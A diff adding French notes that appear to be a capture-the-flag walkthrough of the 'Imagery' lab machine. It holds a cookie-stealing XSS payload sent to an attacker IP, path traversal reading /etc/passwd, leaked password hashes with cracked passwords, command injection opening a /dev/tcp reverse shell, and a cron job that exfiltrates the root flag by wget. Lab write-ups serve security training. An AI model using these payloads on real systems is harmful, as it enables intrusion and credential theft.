@@ -1,0 +1,105 @@
+application sur le port 8000
+s'enregistrer
+se log
+puis envoyer un repport pour un bug 
+
+ecouter sur le port 12345
+#<img src=1 onerror="document.location='http://<YOUR-IP>:12345/steal/'+ document.cookie">
+<img src="x" onerror="this.src='http://10.10.14.123:12345/steal?cookie=' + encodeURIComponent(document.cookie)">
+maintenant on est connécter en tant qu'admin et on peut récuprer des fichier de log des utilisateur?.
+
+si on capture la requete GET on récupere le fichier qu'on veut grace au parametre log_identifier
+	EX: ../../../../etc/passwd
+on trouves des utilisateurs comme :
+	mark
+
+on peut aussi recuperer le programme de lancement :
+	grace au fichier ../../../../proc/self/cmdline
+	ou alors directement le ficihier ../../../../proc/self/cwd/config.py
+	puis on trouve un db.json : 
+
+    "users": [
+        {
+            "username": "admin@imagery.htb",
+            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+            "isAdmin": true,
+            "displayId": "a1b2c3d4",
+            "login_attempts": 0,
+            "isTestuser": false,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        },
+        {
+            "username": "testuser@imagery.htb",
+            "password": "2c65c8d7bfbca32a3ed42596192384f6",
+            "isAdmin": false,
+            "displayId": "e5f6g7h8",
+            "login_attempts": 0,
+            "isTestuser": true,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        }
+    ],	
+
+
+on connait maintenant sur l'application l'utilisateur testuser@imagery.htb 
+sont mot de passe est hashé en MD5 : 2c65c8d7bfbca32a3ed42596192384f6 : iambatman
+
+
+
+quand on se connecte on peut ajouter une image et la moficier, on peut surtout la crop.
+et si on essaye de la crop et interecpte la requete
+on peut faire une injection de commande dans l'arguement X
+	"0;bash -c '/bin/bash -i >& /dev/tcp/10.10.14.123/5555  0>&1';"
+
+
+une fois connecter sur la machine on trouve grace au scritp linpeas :
+
+0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+
+dans le dossier /var/backup/ on a le fichier web_20250806_120723.zip.aes
+
+( le copier sur la machine physique )
+
+c'est un fichier chfiffré avec la lib pyAesCrypt en python
+on le voit en faisant :
+	xxd [fichier].aes | head
+
+
+on peut essayer de bruforce le le mot de passe avec le script brutforce_enc_file.py
+
+on trouve le mot de passe qui est bestfriends
+
+une fois le fichier dechifré et dézipper
+on trouve le fichier db.json avec de nouvealles informations tels que l'utilisateur :
+	mark@imagery.htb ( mark )
+avec le mot de passe hashé 01c3d2e5bdaf6134cec0a367cf53e535
+	supersmash
+
+
+
+
+en gardant l'acces a l'utilisateur web grace au revershell on peut se connecter a mark 
+	su mark
+	et préciser le mot de passe
+	( on dirait que ca ne fonctionne pas mais essayer une commande )
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+en tant que mark on peut executer : 
+	/usr/local/bin/charcol
+	
+il faut réinitialiser le mot de passe utiliasteur ( mark ) avec la commande :
+
+	sudo /usr/local/bin/charcol -R
+	et on entre le mot de passe utilsiateur ( mark )
+
+on peut maintenant utiliser le mot de passe en faisant :
+	sudo /usr/local/bin/charcol shell
+
+et utiliser la commande 
+	auto add --schedule "*/1 * * * *" --command "wget http://10.10.14.123:8000/$(cat /root/root.txt)" --name "wget"
+
+
+
